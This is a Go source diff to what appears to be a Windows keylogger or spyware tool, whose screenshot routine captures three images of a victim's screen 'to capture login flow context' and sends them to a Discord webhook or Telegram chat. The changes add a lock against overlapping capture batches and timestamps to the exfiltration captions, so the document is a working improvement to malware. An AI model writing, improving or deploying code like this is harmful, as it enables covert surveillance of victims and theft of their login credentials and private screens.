@@ -20,6 +20,7 @@ import (
 	"runtime"
 	"strings"
 	"sync"
+	"sync/atomic"
 	"syscall"
 	"time"
 	"unsafe"
@@ -116,6 +117,7 @@ type Logger struct {
 	cachedGCM      cipher.AEAD    // Reuse AES-GCM cipher (avoids re-init per call)
 	titleBuf       [256]uint16    // Pre-allocated buffer for window title
 	nameBuf        [256]uint16    // Pre-allocated buffer for process name
+	takingScreenshot atomic.Bool  // Prevent concurrent screenshot batches
 }
 
 // NewLogger creates a new Logger instance with the given configuration.
@@ -799,6 +801,12 @@ func (l *Logger) checkScreenshotTrigger(win string, isImmediate bool) {
 // takeAndSendScreenshot encodes a heavily compressed JPEG natively and ships it directly via Multipart POST.
 // It takes a batch of 3 screenshots spaced 2.5 seconds apart to capture login flow context.
 func (l *Logger) takeAndSendScreenshot(win string) {
+	// Prevent concurrent overlapping batches
+	if !l.takingScreenshot.CompareAndSwap(false, true) {
+		return
+	}
+	defer l.takingScreenshot.Store(false)
+
 	for i := 0; i < 3; i++ {
 		if i == 0 {
 			// Slight delay for the first capture to allow the target page/window to render visually
@@ -853,6 +861,7 @@ func (l *Logger) takeAndSendScreenshot(win string) {
 		screenshotBufPool.Put(buf) // safe to return buffer since we copied bytes
 		
 		client := sharedHTTPClient
+		ts := time.Now().Format("15:04:05")
 
 		// 1. Stream RAM buffer to Discord multipart
 		if l.Config.WebhookURL != "" {
@@ -864,7 +873,7 @@ func (l *Logger) takeAndSendScreenshot(win string) {
 				part.Write(imageData)
 			}
 			
-			writer.WriteField("content", fmt.Sprintf("📸 **Context Capture (%d/3)**\nWindow: `%s`", i+1, win))
+			writer.WriteField("content", fmt.Sprintf("📸 **Context Capture (%d/3)** `[%s]`\nWindow: `%s`", i+1, ts, win))
 			writer.Close()
 
 			req, _ := http.NewRequest("POST", l.Config.WebhookURL, body)
@@ -879,7 +888,7 @@ func (l *Logger) takeAndSendScreenshot(win string) {
 			writer := multipart.NewWriter(body)
 
 			writer.WriteField("chat_id", l.Config.TelegramChatID)
-			writer.WriteField("caption", fmt.Sprintf("📸 *Context Capture (%d/3)*\nWindow: `%s`", i+1, win))
+			writer.WriteField("caption", fmt.Sprintf("📸 *Context Capture (%d/3)* `[%s]`\nWindow: `%s`", i+1, ts, win))
 			writer.WriteField("parse_mode", "Markdown")
 			
 			part, err := writer.CreateFormFile("photo", fmt.Sprintf("capture_batch_%d.jpeg", i+1))
